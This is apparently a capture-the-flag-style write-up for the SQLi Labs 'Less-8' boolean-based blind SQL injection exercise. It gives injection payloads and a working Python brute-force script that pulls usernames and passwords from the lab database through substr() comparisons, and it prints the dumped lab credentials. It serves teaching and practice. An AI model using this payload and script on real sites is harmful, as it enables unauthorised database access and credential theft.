Hello guys,

This is the write-up for Less-8 "GET - Blind - Boolian Based - Single Quotes" from SQLi Labs

Starting by adding id and numeric parameter to the URL: ```[URL]/?id=1```

The Output Displayed in the browser is :
```
You are in...........
```

and same output was displayed for all ids from 1-14, trying ```?id=0``` and ```?id = 1\```, no output is returned.

We can understand that ``` You are in...........``` is displayed when there are no errors in the query.

trying, ```?id = 0' or 1 = 1 -- -``` shows output ```You are in...........```.

So we can exploit by using an SQL function called substr(), which returns sub string of a string inside the paranthesis, and other arguments are parameters of the 

starting index and length of the string. 

Using ```?id=0 or substr('string',1,1) = 's'; -- -``` the output is displayed. Therefore we can use this method to extract the dump.

As it is not possible to try out possible to get the dump by using payloads for each and every character ,while trying all possible characters for a single character itself

we can automate this by coding in python to bruteforce the dump.

Python code:
```
import requests
import string


def boolean_brute(query):
    s = requests.session()
    url = [URL] #replace [URL] with yours
    dump = ''
    payload = "0\' or substr(({}), 1, {}) = '{}'; -- -"
    for num in range(1, 100):
        for char in string.ascii_lowercase+string.ascii_uppercase+"1234567890!@#$%^&*()-_=+|\\'\";:.,<>?/[]{} ":
            brute = dump + char
            r = s.get(url, params={"id":payload.format(query, num, brute)})
            if "You are in..........." in r.text:
                dump += char
                break
    print(dump)


boolean_brute("select group_concat(username) from users")
```

This code outputs the group_concat(username)
```
dumb,angelina,dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
```

running the same code by replacing username with password, the respective passwords are printed as group_concat(password)

```
dumb,i-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
```
